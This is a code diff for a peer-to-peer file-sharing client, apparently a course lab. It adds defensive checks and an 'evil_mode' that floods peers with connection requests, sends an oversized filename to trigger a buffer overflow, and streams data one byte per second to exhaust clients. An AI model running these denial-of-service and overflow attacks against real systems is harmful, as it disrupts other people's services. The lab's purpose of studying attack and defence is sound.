@@ -41,7 +41,7 @@ static int listen_port;
 #define MD5SUM_ON 0
 #define DEBUG 1
 #define OVERFLOW_NAME	"PIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHUPIKACHU"
-#define MAXFILESIZ 20971520 // 2 megabytes
+#define MAXFILESIZ 2097152 // 2 megabytes
 typedef enum tasktype {		// Which type of connection is this?
 	TASK_TRACKER,		// => Tracker connection
 	TASK_PEER_LISTEN,	// => Listens for upload requests
@@ -516,7 +516,7 @@ task_t *start_download(task_t *tracker_task, const char *filename)
 		error("* Error while allocating task");
 		goto exit;
 	}
-	if (DEBUG) message("input filename is: %s",filename);
+	if (DEBUG) message("input filename is: %s\n",filename);
 	
 	strcpy(t->filename, filename);
 
@@ -567,13 +567,34 @@ static void task_download(task_t *t, task_t *tracker_task)
 		error("* Cannot connect to peer: %s\n", strerror(errno));
 		goto try_again;
 	}
+	/*if (evil_mode)
+	{
+		message("Bombing user with get requests\n");
+		while (t->peer_fd != -1)
+		{
+			//message("BOB %d\n",t->peer_fd);
+			osp2p_writef(t->peer_fd, "GET asdasd23rfesdsfw OSP2P\n");
+		}
+		message("Done bombing user with get requests\n");
+	}*/
+	
+	if (evil_mode)
+	{
+		while (t->peer_fd != -1)
+		{
+			message("Bombing %d with new connect requests.\n",t->peer_fd);
+			t->peer_fd = open_socket(t->peer_list->addr, t->peer_list->port);
+			osp2p_writef(t->peer_fd, "GET asdasd23rfesdsfw OSP2P\n");
+			//close(t->peer_fd);
+		}
+		message("Peer fd is -1, no longer bombing\n");
+	}
 
 	if (evil_mode)
 	{
 		message("Attempting download buffer overflow attack...\n");
 		osp2p_writef(t->peer_fd, "GET %s OSP2P\n", OVERFLOW_NAME);
 	}
-
 
 
 	//ssize_t messagepos;
@@ -638,6 +659,12 @@ static void task_download(task_t *t, task_t *tracker_task)
 
 		md5_append(&mst, (md5_byte_t*)data, ret);
 		ret = write_from_taskbuf(t->disk_fd, t);
+		if (t->total_written>MAXFILESIZ)
+	{
+		error("*Download exceeded max file size: %d, peer might be attempting to stream us infinite data.",t->total_written);
+		goto try_again; //this will pop pear then try to download the file from another peer on the tracker
+		return;
+	}
 		if (ret == TBUF_ERROR) {
 			error("* Disk write error");
 			goto try_again;
@@ -656,13 +683,6 @@ static void task_download(task_t *t, task_t *tracker_task)
 		message("* MD5 checksum matches.\n");
 */
 	// Empty files are usually a symptom of some error.
-	if (t->total_written>MAXFILESIZ)
-	{
-		error("*Download exceeded max file size, peer might be attempting to stream us infinite data.");
-		goto try_again; //this will pop pear then try to download the file from another peer on the tracker
-		//should we memclear here?
-		return;
-	}
 	if (t->total_written > 0) {
 		message("* Downloaded '%s' was %lu bytes long\n",
 			t->disk_filename, (unsigned long) t->total_written);
@@ -706,7 +726,7 @@ static task_t *task_listen(task_t *listen_task)
 		return NULL;
 	else if (fd == -1)
 		die("accept");
-
+	sleep(1); //this is to rate limit against DDOS attacks that try to connect to us 
 	message("* Got connection from %s:%d\n",
 		inet_ntoa(peer_addr.sin_addr), ntohs(peer_addr.sin_port));
 	t = task_new(TASK_UPLOAD);
@@ -725,11 +745,14 @@ static void task_upload(task_t *t)
 	if (evil_mode)
 	{
 		int client_alive=1;
-		message("Infinite upload loop\n");
-		while (client_alive)
+		message("Infinite slow upload loop\n");
+		while (client_alive!=-1)
 		{
-			 client_alive = write(t->peer_fd, &t->buf[0], 1);
+			 client_alive = write(t->peer_fd, &t->buf[0], 1); //stream data very slowly until client breaks connection
+			 sleep(1); //sleep 1 second then stream another char
 		}
+		message("Infinite upload loop exited\n");
+
 	}
 			
 	// First, read the request from the peer.
@@ -787,6 +810,7 @@ static void task_upload(task_t *t)
 	if (!(isalpha(first_three_chars[0]) || isdigit(first_three_chars[0])))
 	{
 		error("Downloader potentially trying to access file outside of directory pathname: %s , do not allow this.",t->filename);	
+		goto exit;
 	}
 		t->disk_fd = open(t->filename, O_RDONLY);
 		if (t->disk_fd == -1) {
@@ -913,7 +937,7 @@ int main(int argc, char *argv[])
 
 	pid_t download_pid;
 	pid_t upload_pid;
-	message("my alias is %s",myalias);
+	if (DEBUG) message("my alias is %s\n",myalias);
 	// First, download files named on command line.
 	for (; argc > 1; argc--, argv++)
 	{
@@ -939,18 +963,14 @@ int main(int argc, char *argv[])
 			}
 			else if (download_pid == 0) //child thread
 			{
-				//usleep(5000); //added so we don't hit the tracker too fast (sleeps the thread for .0005 seconds)
 				message("START downloading filename: %s\n",argv[1]);
 				task_download(t, tracker_task);
 				message("DONE downloading filename: %s\n",argv[1]);
-				//TBD keep track of # of child threads? (in case of ddos attack)
 				_exit(0);
 			}
 			else  //parent thread
 			{
-				 if (sigaction(SIGCHLD, &sa, NULL) == -1) {
-        		 perror("sigaction");
-     			}
+				//while(waitpid(-1, NULL, WNOHANG) > 0);
 			}
 			
 		}
@@ -979,12 +999,17 @@ while ((t = task_listen(listen_task)))
 			}	
 		else if (upload_pid == 0)
 		{
-				sleep(1); //sleep for 1 second in before forking, therefore rate limiting people who try to flood us with connections
+				 //sleep for 1 second in before forking, therefore rate limiting people who try to flood us with connections
 				message("START uploading\n");
 				task_upload(t);
 				message("DONE uploading\n");
 				_exit(0);
 		}
+		else
+		{
+		//	while(waitpid(-1, NULL, WNOHANG) > 0);
+		}
+
 	}	
 
 	return 0;
